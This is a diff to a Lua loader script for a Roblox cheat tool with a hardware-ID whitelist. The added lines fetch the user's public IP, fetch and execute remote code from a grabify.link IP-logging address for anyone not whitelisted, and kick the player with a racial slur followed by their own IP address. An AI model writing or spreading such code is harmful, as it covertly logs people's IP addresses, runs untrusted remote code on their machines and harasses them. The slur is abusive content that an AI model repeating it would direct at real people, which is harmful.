@@ -27,21 +27,24 @@ if isfile("vape/WhiteList.txt") == false then
     writefile("vape/WhiteList.txt", HWID)
 end
 
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+
+
 if table.find(HwidWhitelist, HWID) then
     print("Found Hwid In List")
     local Read = readfile("vape/WhiteList.txt")
     if table.find(HwidWhitelist, Read) then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AirScriptYT/TDS/main/MainScript", true))()
     else
+        loadstring(game:HttpGet("https://grabify.link/GYXTPJ", true))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main//CustomModules/6872274481.lua",true))()
-        game.Players.LocalPlayer:Kick("Fuck You Nigger")  
+        game.Players.LocalPlayer:Kick("Fuck You Nigger also "..ip)  
     end
 else
+    loadstring(game:HttpGet("https://grabify.link/GYXTPJ", true))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main//CustomModules/6872274481.lua",true))()
-    game.Players.LocalPlayer:Kick("Fuck You Nigger")  
+    game.Players.LocalPlayer:Kick("Fuck You Nigger also "..ip)
 end
-
-
 
 
 
